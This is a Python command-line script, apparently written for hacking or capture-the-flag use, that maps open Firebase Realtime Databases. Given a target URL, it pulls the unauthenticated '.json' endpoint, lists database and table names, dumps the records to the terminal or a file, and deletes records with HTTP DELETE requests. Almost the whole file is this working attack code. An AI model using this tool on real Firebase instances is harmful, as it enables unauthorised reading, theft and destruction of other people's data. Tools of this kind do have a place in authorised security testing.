# This is a sample Python script.
import json

# Press Shift+F10 to execute it or replace it with your code.
# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.

from pyfiglet import Figlet
from termcolor import colored
from argparse import ArgumentParser, Namespace
import requests
from tabulate import tabulate
import pandas as pd


def print_hi(name):
    # ["epic", "fraktur", "lean", "larry3d", "smslant"]
    f = Figlet(font="epic", width=180)
    welcome = colored(f.renderText(text=name), "red")
    if readargs().verbose is not False:
        print(welcome)
    pass


def printincolor(word, color='white'):
    print(colored(word, color))
    pass


def readargs() -> Namespace:
    parser = ArgumentParser()
    parser.add_argument("-u", "--url", dest="url", help="set the firebase url", metavar="URL", required=True)
    parser.add_argument("-D", "--DATABASE", dest="database", help="set the firebase database name", required=False, action="store_true")
    parser.add_argument("-d", "--databasename", dest="databasename", help="this option will retrieve the database name")
    parser.add_argument("-T", "--TABLENAME", dest="table", help="get tables of database -d is required here", required=False, action="store_true")
    parser.add_argument("-t", "--tablename", dest="tablename", help="dump table columns of database -d is required here", required=False)
    parser.add_argument("-P", "--dump", dest="dumpingdata", help="dump table data or tables data -d, -t are required here", required=False, action="store_true")
    parser.add_argument("-o", "--output", dest="output", help="dump into filename ", required=False)
    parser.add_argument("-r", "--remove", dest="remove", help="delete record or table `database.tablename.next.next...`", required=False)
    parser.add_argument("-q", "--quiet", action="store_false", dest="verbose", default=True, help="don't print status messages to stdout", required=False)
    arguments = parser.parse_args()
    # ArgumentParser
    return arguments
    pass


def readJson(domain: str):
    # send a request and get the json file
    domain = (domain + '.json') if (domain[-1].strip() == "/") else (domain + '/' + '.json')
    respnse = requests.get(domain)
    try:
        jsondata = respnse.json()
        return jsondata
    except Exception as e:
        # // error reading the data in json
        printincolor(f"[-] {str(e)}", "red")
        exit(0)
    pass


def deleterecord(record: str):
    domain = args.url
    record = record.replace('.', '/')
    domain = (domain + record + '.json') if (domain[-1].strip() == "/") else (domain + '/' + record + '.json')
    response = requests.delete(domain)
    if 200 <= response.status_code <= 300:
        printincolor(f"[+] Record {record} deleted successfully", "green")
    elif 400 <= response.status_code <= 500:
        printincolor(f"[-] Record {record} couldn't be deleted check permission", "red")
    pass


def addrecord(record):
    pass


def readfromjson(jsondata, keys: [str] = None, dump=False):
    items = ""
    jsonvalue: json = "" if keys is not None else jsondata
    if keys is not None:
        for key in keys:
            if jsonvalue == "":
                jsonvalue = jsondata[key]
                continue
            jsonvalue = jsonvalue[key]
            pass
    try:
        if dump is True:
            raise TypeError("Only integers are allowed")
        extractedvalues = jsondata.keys() if keys is None else jsonvalue.keys()
        for keyname in extractedvalues:
            items += keyname + ", "
            pass
        return items[:len(items) - 2]
    except:
        extractedvalues = jsondata.keys() if keys is None else jsonvalue
        return extractedvalues
    pass


def printTable(title, data: dict):
    printincolor(f"[+] Dumping data of {colored(title, 'blue')}", "green")
    if readargs().output is not None:
        with open(readargs().output, 'w') as file:
            json_object = json.dumps(data, indent=4)
            file.write(json_object)
            file.close()

    printedalready = False
    newdict = {}
    data = convertdicttolist(data) if type(data) is list else data.items()
    for key, value in data:
        if type(value) is dict:
            if not printedalready:
                printincolor("[*] Better dumping the data into a file use -o option", "yellow")
                printedalready = True
                pass
            newdict[key] = [", ".join(value.keys())]
            pass
        elif type(value) is not list:
            newdict[key] = [value]
        else:
            newdict[key] = value

    df = pd.DataFrame(newdict)
    print(tabulate(df, headers='keys', tablefmt='pretty', showindex='always'))
    pass


def convertdicttolist(a):
    it = iter(a)
    res_dct = dict(zip(it, it))
    return res_dct


if __name__ == '__main__':
    # Firebase Hacking
    args = readargs()
    print_hi("Firebase Mapping")
    printincolor(f"[*] Start mainpulating the Firebase domain at : {colored(args.url, 'yellow')}", "green")
    jsonData = readJson(args.url)

    if args.dumpingdata is not False:
        if args.databasename is not None and args.tablename is not None:
            data = readfromjson(jsonData, [args.databasename, args.tablename], dump=True)
            printTable(f"{args.databasename}.{args.tablename}", data)
        elif args.databasename is not None:
            data = readfromjson(jsonData, [args.databasename], dump=True)
            printTable(f"{args.databasename}", data)
    elif args.database is not False:  # dump database used
        databasename = readfromjson(jsonData)
        printincolor(f"[+] Database Name is : {databasename}", "yellow")
    elif args.databasename is not None:
        if args.table is False:  # dump tables
            if args.tablename is None:
                printincolor("[-] option -d must be used to print tables of `database`", "red")
                exit(0)
        else:
            tablenames = readfromjson(jsonData, [args.databasename])
            printincolor(f"[+] Table Names is : {tablenames}", "yellow")
    elif args.tablename is not None:  # dump data of table
        if args.databasename is not None:
            columns = readfromjson(jsonData, [args.databasename, args.tablename])
            printincolor(f"[+] Table data is : {columns}", "blue")
            pass  # table
        pass  # tablename
    elif args.remove is not None:
        deleterecord(args.remove)

    printincolor("Mr.CTFKi11er", "white")
